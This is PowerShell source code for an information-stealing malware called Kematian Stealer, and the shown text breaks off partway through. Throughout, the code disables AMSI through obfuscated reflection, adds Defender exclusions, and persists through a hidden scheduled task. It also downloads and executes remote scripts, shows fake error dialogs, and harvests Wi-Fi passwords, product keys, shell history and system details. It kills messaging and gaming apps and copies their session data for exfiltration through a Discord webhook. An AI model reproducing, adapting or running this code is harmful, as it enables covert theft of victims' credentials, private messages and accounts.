$webhook = "YOUR_WEBHOOK_HERE" # DONT USE THIS IF YOU ENABLE AUTO UPDATE INSTEAD REPLACE "PUT YOUR WEBHOOK HERE IF YOU NEED AUTOUPDATE" WITH YOUR DISCORD WEBHOOK
$debug = $false
$autoupdate = $false
$blockhostsfile = $true
$criticalprocess = $true
$melt = $false
$fakeerror = $false
$persistence = $true


if ($debug) {
    $ProgressPreference = 'Continue'
}
else {
    $ErrorActionPreference = 'SilentlyContinue'
    $ProgressPreference = 'SilentlyContinue'
}

$avatar = "https://i.imgur.com/DOIYOtp.gif"

function KDMUTEX {
	if ($fakeerror ) {Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.MessageBox]::Show("The program can't start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.",'','OK','Error')}
    $AppId = "a0e59cd1-5d22-4ae1-967b-1bf3e1d36d6b" 
    $CreatedNew = $false
    $script:SingleInstanceEvent = New-Object Threading.EventWaitHandle $true, ([Threading.EventResetMode]::ManualReset), "Global\$AppID", ([ref] $CreatedNew)
    if ( -not $CreatedNew ) { throw "[!] An instance of this script is already running."}
    else {
        if ($debug) {
            Invoke-TASKS
        }
        else {
            VMPROTECT
        }
    }
}
Add-Type -AssemblyName PresentationCore, PresentationFramework

function AUTOUPDATE {
    if ($autoupdate) { 
    New-Item -ItemType Directory -Path "$env:APPDATA\Kematian" -Force
	Add-MpPreference -ExclusionPath "$env:APPDATA\Kematian" -Force
    Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
    $Content = @"
`$t=(Iwr -Uri "https://github.com/Chainski/Kematian-Stealer/raw/main/frontend-src/main.ps1" -useb);`$t-replace "YOUR_WEBHOOK_HERE", "PUT YOUR WEBHOOK HERE IF YOU NEED AUTOUPDATE" | IEX
"@
    [IO.File]::WriteAllText("$env:APPDATA\Kematian\Kematian.ps1", $Content)
	$KDOT_DIR = get-item "$env:APPDATA\Kematian" -Force
    $KDOT_DIR.attributes = "Hidden", "System"
    $url = "https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/Kematian.pfx"
    $outputPath = "$env:tmp\Kematian.pfx"
    if (Test-Path $outputPath) {Remove-Item $outputPath -Force}
    Invoke-WebRequest -Uri $url -OutFile $outputPath 
    $certificatePath = $outputPath
    $certificatePassword = ConvertTo-SecureString -String "Kematian" -AsPlainText -Force
    $certificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($certificatePath, $certificatePassword)
    Set-AuthenticodeSignature -FilePath "$env:APPDATA\Kematian\Kematian.ps1" -Certificate $certificate -TimestampServer "http://timestamp.comodoca.com"
    ri "$env:tmp\Kematian.pfx" -Force	
    $task_name = "Kematian"
    if ($debug) {
    $task_action = New-ScheduledTaskAction -Execute "PowerShell" -Argument "-ExecutionPolicy Bypass -File %appdata%\Kematian\Kematian.ps1"
    }
     else {
    $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\Kematian\Kematian.ps1",0)(window.close)'
    }
    $task_trigger = New-ScheduledTaskTrigger -AtLogOn
    $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
    Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Kematian" -RunLevel Highest -Force
	Start-ScheduledTask -TaskName "Kematian"
    if ($melt) {ri $pscommandpath -force}
    }
    else {
        KDMUTEX
    }
}

#THIS CODE WAS MADE BY EvilByteCode
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public static class ProcessUtility
{
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);

    public static void MakeProcessCritical()
    {
        Process.EnterDebugMode();
        RtlSetProcessIsCritical(1, 0, 0);
    }

    public static void MakeProcessKillable()
    {
        RtlSetProcessIsCritical(0, 0, 0);
    }
}
"@
#END OF CODE MADE BY EvilByteCode

# Request admin with AMSI bypass
function CHECK_AND_PATCH {
    ${kDOt} = [Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils').GetField('am' + 'siInitFailed', 'NonPublic,Static');
    ${CHaINSki} = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JGtkb3QuU2V0VmFsdWUoJG51bGwsJHRydWUp")) | &([regex]::Unescape("\u0069\u0065\u0078"))
    $kdotcheck = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
    return $kdotcheck
}

function VMPROTECT {
if ($criticalprocess) {
	$link = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/antivm.ps1")
	iex (iwr -uri $link -useb)
    [ProcessUtility]::MakeProcessCritical()
	Invoke-TASKS
	}
 else {
	 $link = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/antivm.ps1")
	 iex (iwr -uri $link -useb)
     Invoke-TASKS
   }
}


function Request-Admin {
 while (-not (CHECK_AND_PATCH)) {if ($debug -eq $true) {
        try {Start-Process "powershell" -ArgumentList "-NoP -Ep Bypass -File `"$PSCommandPath`"" -Verb RunAs;exit} catch {}
    }
    else {
        try {Start-Process "powershell" -ArgumentList "-Win Hidden -NoP -Ep Bypass -File `"$PSCommandPath`"" -Verb RunAs;exit} catch {}
    } 
 }	
}

function Backup-Data {

    $uuid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
    $timezone = Get-TimeZone
    $offsetHours = $timezone.BaseUtcOffset.Hours
    $timezoneString = "UTC$offsetHours"
    $filedate = Get-Date -Format "yyyy-MM-dd"
    $cc = (Invoke-WebRequest -Uri "https://www.cloudflare.com/cdn-cgi/trace" -useb).Content
    $countrycode = ($cc -split "`n" | ? {$_ -match '^loc=(.*)$'} | % { $Matches[1] })
    $folderformat = "$env:APPDATA\Kematian\$countrycode-($uuid)-($filedate)-($timezoneString)"

    $folder_general = $folderformat
    $folder_messaging = "$folderformat\Messaging Sessions"
    $folder_gaming = "$folderformat\Gaming Sessions"
    $folder_crypto = "$folderformat\Crypto Wallets"
    $folder_vpn = "$folderformat\VPN Clients"
    $folder_email = "$folderformat\Email Clients"
    $important_files = "$folderformat\Important Files"
    $browser_data = "$folderformat\Browser Data"
	$filezilla_bkp = "$folderformat\FileZilla"

    $folders = @($folder_general, $folder_messaging, $folder_gaming, $folder_crypto, $folder_vpn, $folder_email, $important_files, $browser_data, $filezilla_bkp)
    $folders | ForEach-Object {
        New-Item -ItemType Directory -Path $_ -Force
    }

    #bulk data (added build ID with banner)
    function Get-Network {
	$resp = (Invoke-WebRequest -Uri "https://www.cloudflare.com/cdn-cgi/trace" -useb).Content
    $ip = [regex]::Match($resp, 'ip=([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)').Groups[1].Value
    $url = "http://ip-api.com/json"
	$hosting = (Invoke-WebRequest -Uri "http://ip-api.com/line/?fields=hosting" -useb).Content
    $response = Invoke-RestMethod -Uri $url -Method Get
    if (-not $response) {
        return "Not Found"
    }
    $country = $response.country
    $regionName = $response.regionName
    $city = $response.city
    $zip = $response.zip
    $lat = $response.lat
    $lon = $response.lon
    $isp = $response.isp
    return "IP: $ip `nCountry: $country `nRegion: $regionName `nCity: $city `nISP: $isp `nLatitude: $lat `nLongitude: $lon `nVPN/Proxy: $hosting"
    }
    $networkinfo = Get-Network
    $lang = (Get-WinUserLanguageList).LocalizedName
    $date = Get-Date -Format "r"
    $osversion = (Get-CimInstance -ClassName Win32_OperatingSystem).Caption
    $osbuild = (Get-ItemProperty -Path "C:\Windows\System32\hal.dll").VersionInfo.FileVersion
    $displayversion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").DisplayVersion
    $mfg = (Get-CimInstance -ClassName Win32_ComputerSystem).Manufacturer
    $model = (Get-CimInstance -ClassName Win32_ComputerSystem).Model
    $CPU = (Get-CimInstance -ClassName Win32_Processor).Name
    $corecount = (Get-CimInstance -ClassName Win32_Processor).NumberOfCores
    $GPU = (Get-CimInstance -ClassName Win32_VideoController).Name
    $total = (Get-CimInstance -ClassName Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB
    $raminfo = "{0:N2} GB" -f $total
    $mac = (Get-CimInstance -ClassName Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true }).MACAddress -join ","
    $username = $env:USERNAME
    $hostname = $env:COMPUTERNAME
    
    # A cool banner 
    $guid = [Guid]::NewGuid()
    $guidString = $guid.ToString()
    $suffix = $guidString.Substring(0, 8)  
    $prefixedGuid = "Kematian-Stealer-" + $suffix
    $kematian_banner = ("4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXDQrilZEgICAgICAgICAgICAgICAg4paI4paI4pWXICDilojilojilZfilojilojilojilojilojilojilojilZfilojilojilojilZcgICDilojilojilojilZcg4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVlyDilojilojilojilojilojilZcg4paI4paI4paI4pWXICAg4paI4paI4pWXICAgIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilojilojilZcg4paI4paI4pWXICAgICDilojilojilojilojilojilojilojilZfilojilojilojilojilojilojilZcgICAgICAgICAgICAgICAgIOKVkQ0K4pWRICAgICAgICAgICAgICAgIOKWiOKWiOKVkSDilojilojilZTilZ3ilojilojilZTilZDilZDilZDilZDilZ3ilojilojilojilojilZcg4paI4paI4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4pWa4pWQ4pWQ4paI4paI4pWU4pWQ4pWQ4pWd4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4paI4paI4pWXICDilojilojilZEgICAg4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWQ4paI4paI4pWU4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWRICAgICDilojilojilZTilZDilZDilZDilZDilZ3ilojilojilZTilZDilZDilojilojilZcgICAgICAgICAgICAgICAg4pWRDQrilZEgICAgICAgICAgICAgICAg4paI4paI4paI4paI4paI4pWU4pWdIOKWiOKWiOKWiOKWiOKWiOKVlyAg4paI4paI4pWU4paI4paI4paI4paI4pWU4paI4paI4pWR4paI4paI4paI4paI4paI4paI4paI4pWRICAg4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4paI4paI4paI4paI4paI4pWR4paI4paI4pWU4paI4paI4pWXIOKWiOKWiOKVkSAgICDilojilojilojilojilojilojilojilZcgICDilojilojilZEgICDilojilojilojilojilojilZcgIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkeKWiOKWiOKVkSAgICAg4paI4paI4paI4paI4paI4pWXICDilojilojilojilojilojilojilZTilZ0gICAgICAgICAgICAgICAg4pWRDQrilZEgICAgICAgICAgICAgICAg4paI4paI4pWU4pWQ4paI4paI4pWXIOKWiOKWiOKVlOKVkOKVkOKVnSAg4paI4paI4pWR4pWa4paI4paI4pWU4pWd4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWRICAg4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWR4paI4paI4pWR4pWa4paI4paI4pWX4paI4paI4pWRICAgIOKVmuKVkOKVkOKVkOKVkOKWiOKWiOKVkSAgIOKWiOKWiOKVkSAgIOKWiOKWiOKVlOKVkOKVkOKVnSAg4paI4paI4pWU4pWQ4pWQ4paI4paI4pWR4paI4paI4pWRICAgICDilojilojilZTilZDilZDilZ0gIOKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVlyAgICAgICAgICAgICAgICDilZENCuKVkSAgICAgICAgICAgICAgICDilojilojilZEgIOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVkSDilZrilZDilZ0g4paI4paI4pWR4paI4paI4pWRICDilojilojilZEgICDilojilojilZEgICDilojilojilZHilojilojilZEgIOKWiOKWiOKVkeKWiOKWiOKVkSDilZrilojilojilojilojilZEgICAg4paI4paI4paI4paI4paI4paI4paI4pWRICAg4paI4paI4pWRICAg4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWRICDilojilojilZHilojilojilojilojilojilojilojilZfilojilojilojilojilojilojilojilZfilojilojilZEgIOKWiOKWiOKVkSAgICAgICAgICAgICAgICDilZENCuKVkSAgICAgICAgICAgICAgICDilZrilZDilZ0gIOKVmuKVkOKVneKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVnSAgICAg4pWa4pWQ4pWd4pWa4pWQ4pWdICDilZrilZDilZ0gICDilZrilZDilZ0gICDilZrilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWQ4pWQ4pWdICAgIOKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVnSAgIOKVmuKVkOKVnSAgIOKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWd4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWdICDilZrilZDilZ0gICAgICAgICAgICAgICAg4pWRDQrilZEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGh0dHBzOi8vZ2l0aHViLmNvbS9DaGlsZHJlbk9mWWFod2VoL0tlbWF0aWFuLVN0ZWFsZXIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKVkQ0K4pWRICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBSZWQgVGVhbWluZyBhbmQgT2ZmZW5zaXZlIFNlY3VyaXR5ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICDilZENCuKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVnQ0K")
    $kematian_strings = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($kematian_banner))
    $kematian_info = "$kematian_strings `nLog Name : $hostname `nBuild ID : $prefixedGuid`n"
    
    function Get-Uptime {
        $ts = (Get-Date) - (Get-CimInstance -ClassName Win32_OperatingSystem -ComputerName $computername).LastBootUpTime
        $uptimedata = '{0} days {1} hours {2} minutes {3} seconds' -f $ts.Days, $ts.Hours, $ts.Minutes, $ts.Seconds
        $uptimedata
    }
    $uptime = Get-Uptime

    function Get-InstalledAV {
        $wmiQuery = "SELECT * FROM AntiVirusProduct"
        $AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery
        $AntivirusProduct.displayName
    }
    $avlist = Get-InstalledAV | Format-Table | Out-String
    
    $width = (Get-WmiObject -Class Win32_VideoController).VideoModeDescription -split '\n' | Select-Object -First 1 | ForEach-Object { ($_ -split ' ')[0] }
    $height = (Get-WmiObject -Class Win32_VideoController).VideoModeDescription -split '\n' | Select-Object -First 1 | ForEach-Object { ($_ -split ' ')[2] }
    $screen = "$width x $height"

    $software = Get-ItemProperty "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" |
    Where-Object { $_.DisplayName -ne $null -and $_.DisplayVersion -ne $null } |
    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
    Format-Table -Wrap -AutoSize |
    Out-String

    $network = Get-NetAdapter |
    Select-Object Name, InterfaceDescription, PhysicalMediaType, NdisPhysicalMedium |
    Out-String

    $startupapps = Get-CimInstance Win32_StartupCommand |
    Select-Object Name, Command, Location, User |
    Format-List |
    Out-String

    $runningapps = Get-WmiObject Win32_Process |
    Select-Object Name, Description, ProcessId, ThreadCount, Handles |
    Format-Table -Wrap -AutoSize |
    Out-String

    $services = Get-WmiObject Win32_Service |
    Where-Object State -eq "Running" |
    Select-Object Name, DisplayName |
    Sort-Object Name |
    Format-Table -Wrap -AutoSize |
    Out-String
    
    function diskdata {
        $disks = Get-WmiObject -Class "Win32_LogicalDisk" -Namespace "root\CIMV2" | Where-Object { $_.Size -gt 0 }
        $results = foreach ($disk in $disks) {
            $SizeOfDisk = [math]::Round($disk.Size / 1GB, 0)
            $FreeSpace = [math]::Round($disk.FreeSpace / 1GB, 0)
            $usedspace = [math]::Round(($disk.Size - $disk.FreeSpace) / 1GB, 2)
            $FreePercent = [int](($FreeSpace / $SizeOfDisk) * 100)
            $usedpercent = [int](($usedspace / $SizeOfDisk) * 100)
            [PSCustomObject]@{
                Drive             = $disk.Name
                "Total Disk Size" = "{0:N0} GB" -f $SizeOfDisk 
                "Free Disk Size"  = "{0:N0} GB ({1:N0} %)" -f $FreeSpace, $FreePercent
                "Used Space"      = "{0:N0} GB ({1:N0} %)" -f $usedspace, $usedpercent
            }
            Write-Output ""  
        }
        $results | Where-Object { $_.PSObject.Properties.Value -notcontains '' }
    }
    
    $alldiskinfo = diskdata -wrap -autosize | Format-List | Out-String
    $alldiskinfo = $alldiskinfo.Trim()

    $info = "$kematian_info`n`n[Network] `n$networkinfo `n[Disk Info] `n$alldiskinfo `n`n[System] `nLanguage: $lang `nDate: $date `nTimezone: $timezoneString `nScreen Size: $screen `nUser Name: $username `nOS: $osversion `nOS Build: $osbuild `nOS Version: $displayversion `nManufacturer: $mfg `nModel: $model `nCPU: $cpu `nCores: $corecount `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime `nAntiVirus: $avlist `n`n[Network Adapters] $network `n[Startup Applications] $startupapps `n[Processes] $runningapps `n[Services] $services `n[Software] $software"
    $info | Out-File -FilePath "$folder_general\System.txt" -Encoding UTF8

    Function Get-WiFiInfo {
    $wifidir = "$env:tmp"
    New-Item -Path "$wifidir\wifi" -ItemType Directory -Force | Out-Null
	netsh wlan export profile folder="$wifidir\wifi" key=clear | Out-Null
    $xmlFiles = Get-ChildItem "$wifidir\wifi\*.xml"
    if ($xmlFiles.Count -eq 0) {
        return $false
    }
    $wifiInfo = @()
    foreach ($file in $xmlFiles) {
        [xml]$xmlContent = Get-Content $file.FullName
        $wifiName = $xmlContent.WLANProfile.SSIDConfig.SSID.name
        $wifiPassword = $xmlContent.WLANProfile.MSM.security.sharedKey.keyMaterial
        $wifiAuth = $xmlContent.WLANProfile.MSM.security.authEncryption.authentication
        $wifiInfo += [PSCustomObject]@{
            SSID = $wifiName
            Password = $wifiPassword
            Auth = $wifiAuth
        }
    }
    $wifiInfo | Format-Table -AutoSize | Out-String
	$wifiInfo | Out-File -FilePath "$folder_general\WIFIPasswords.txt" -Encoding UTF8
    }
    $wifipasswords = Get-WiFiInfo 
    ri "$env:tmp\wifi" -Recurse -Force

    function Get-ProductKey {
        try {
            $regPath = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform'
            $keyName = 'BackupProductKeyDefault'
            $backupProductKey = Get-ItemPropertyValue -Path $regPath -Name $keyName
            return $backupProductKey
        }
        catch {
            return "No product key found"
        }
    }
    Get-ProductKey > $folder_general\productkey.txt

    try {
        Get-Content (Get-PSReadlineOption).HistorySavePath | Out-File -FilePath "$folder_general\clipboard_history.txt" -Encoding UTF8
    } catch {
        # PSReadline is probably not enabled.
    }


    # All Messaging Sessions
    function telegramstealer {
        $processname = "telegram"
        $pathtele = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
        if (!(Test-Path $pathtele)) { return }
        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
        $destination = "$folder_messaging\Telegram.zip"
        $exclude = @("_*.config", "temp", "dumps", "tdummy", "emoji", "user_data", "user_data#2", "user_data#3", "user_data#4", "user_data#5", "user_data#6", "*.json", "webview")
        $files = Get-ChildItem -Path $pathtele -Exclude $exclude
        Compress-Archive -Path $files -DestinationPath $destination -CompressionLevel Fastest -Force
    }


    # Element Session Stealer
    function elementstealer {
        $processname = "element"
        $elementfolder = "$env:userprofile\AppData\Roaming\Element"
        if (!(Test-Path $elementfolder)) { return }
        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
        $element_session = "$folder_messaging\Element"
        New-Item -ItemType Directory -Force -Path $element_session
        Copy-Item -Path "$elementfolder\databases" -Destination $element_session -Recurse -force 
        Copy-Item -Path "$elementfolder\Local Storage" -Destination $element_session -Recurse -force 
        Copy-Item -Path "$elementfolder\Session Storage" -Destination $element_session -Recurse -force 
        Copy-Item -Path "$elementfolder\IndexedDB" -Destination $element_session -Recurse -force 
        Copy-Item -Path "$elementfolder\sso-sessions.json" -Destination $element_session -Recurse -force 
    }


    # ICQ Session Stealer
    function icqstealer {
        $processname = "icq"
        $icqfolder = "$env:userprofile\AppData\Roaming\ICQ"
        if (!(Test-Path $icqfolder)) { return }
        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue') { Get-Process -Name $processname  | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
        $icq_session = "$folder_messaging\ICQ"
        New-Item -ItemType Directory -Force -Path $icq_session 
        Copy-Item -Path "$icqfolder\0001" -Destination $icq_session -Recurse -force 
    }


    # Signal Session Stealer
    function signalstealer {
        $processname = "signal"
        $signalfolder = "$env:userprofile\AppData\Roaming\Signal"
        if (!(Test-Path $signalfolder)) { return }
        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
        $signal_session = "$folder_messaging\Signal"
        New-Item -ItemType Directory -Force -Path $signal_session
        Copy-Item -Path "$signalfolder\databases" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\Local Storage" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\Session Storage" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\sql" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\config.json" -Destination $signal_session -Recurse -force
    }


    # Viber Session Stealer
    function viberstealer {
        $processname = "viber"
        $viberfolder = "$env:userprofile\AppData\Roaming\ViberPC"
        if (!(Test-Path $viberfolder)) { return }
        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
        $viber_session = "$folder_messaging\Viber"
        New-Item -ItemType Directory -Force -Path $viber_session
        $configfiles = @("config$1")
        foreach ($file in $configfiles) {
            Get-ChildItem -path $viberfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach-Object { Copy-Item -path $PSItem.FullName -Destination $viber_session }
        }
        $pattern = "^([\+|0-9 ][ 0-9.]{1,12})$"
        $directories = Get-ChildItem -Path $viberFolder -Directory | Where-Object { $_.Name -match $pattern }
        foreach ($directory in $directories) {
            $destinationPath = Join-Path -Path $viber_session -ChildPath $directory.Name
            Copy-Item -Path $directory.FullName -Destination $destinationPath -Force
        }
        $files = Get-ChildItem -Path $viberFolder -File -Recurse -Include "*.db", "*.db-shm", "*.db-wal" | Where-Object { -not $_.PSIsContainer }
        foreach ($file in $files) {
            $parentFolder = Split-Path -Path $file.FullName -Parent
            $phoneNumberFolder = Get-ChildItem -Path $parentFolder -Directory | Where-Object { $_.Name -match $pattern }
            if (-not $phoneNumberFolder) {
                Copy-Item -Path $file.FullName -Destination $destinationPath
            }
        }
    }


    # Whatsapp Session Stealer
    function whatsappstealer {
        $processname = "whatsapp"
        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
        $whatsapp_session = "$folder_messaging\Whatsapp"
        New-Item -ItemType Directory -Force -Path $whatsapp_session
        $regexPattern = "WhatsAppDesktop"
        $parentFolder = Get-ChildItem -Path "$env:localappdata\Packages" -Directory | Where-Object { $_.Name -match $regexPattern }
        if ($parentFolder) {
            $localStateFolder = Get-ChildItem -Path $parentFolder.FullName -Filter "LocalState" -Recurse -Directory
            if ($localStateFolder) {
                $destinationPath = Join-Path -Path $whatsapp_session -ChildPath $localStateFolder.Name
                Copy-Item -Path $localStateFolder.FullName -Destination $destinationPath -Recurse
            }
        }
    }

    function skype_stealer {
        $processname = "skype"
        $skypefolder = "$env:appdata\microsoft\skype for desktop"
        if (!(Test-Path $skypefolder)) { return }
        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
        $skype_session = "$folder_messaging\Skype"
        New-Item -ItemType Directory -Force -Path $skype_session
        Copy-Item -Path "$skypefolder\Local Storage" -Destination $skype_session -Recurse -force
    }
	
	function pidgin_stealer {
        $pidgin_folder = "$env:userprofile\AppData\Roaming\.purple"
        if (!(Test-Path $pidgin_folder)) { return }
        $pidgin_accounts = "$folder_messaging\Pidgin"
        New-Item -ItemType Directory -Force -Path $pidgin_accounts
        Copy-Item -Path "$pidgin_folder\accounts.xml" -Destination $pidgin_accounts -Recurse -force 
    }

    # All Gaming Sessions
    # Steam Session Stealer
    function steamstealer {
        $processname = "steam"
        $steamfolder = ("${Env:ProgramFiles(x86)}\Steam")
        if (!(Test-Path $steamfolder)) { return }
        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
        $steam_session = "$folder_gaming\Steam"
        New-Item -ItemType Directory -Force -Path $steam_session
        Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -force
        $ssfnfiles = @("ssfn$1")
        foreach ($file in $ssfnfiles) {
            Get-ChildItem -path $steamfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach-Object { Copy-Item -path $PSItem.FullName -Destination $steam_session }
        }
    }


    # Minecraft Session Stealer
    function minecraftstealer {
        $minecraft_session = "$folder_gaming\Minecraft"
        if (!(Test-Path $minecraft_session)) { return }
        New-Item -ItemType Directory -Force -Path $minecraft_session
        $minecraftfolder1 = $env:appdata + "\.minecraft"
        $minecraftfolder2 = $env:userprofile + "\.lunarclient\settings\game"
        Get-ChildItem $minecraftfolder1 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session 
        Get-ChildItem $minecraftfolder2 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session 
    }

    # Epicgames Session Stealer
    function epicgames_stealer {
        $processname = "epicgameslauncher"
        $epicgamesfolder = "$env:localappdata\EpicGamesLauncher"
        if (!(Test-Path $epicgamesfolder)) { return }
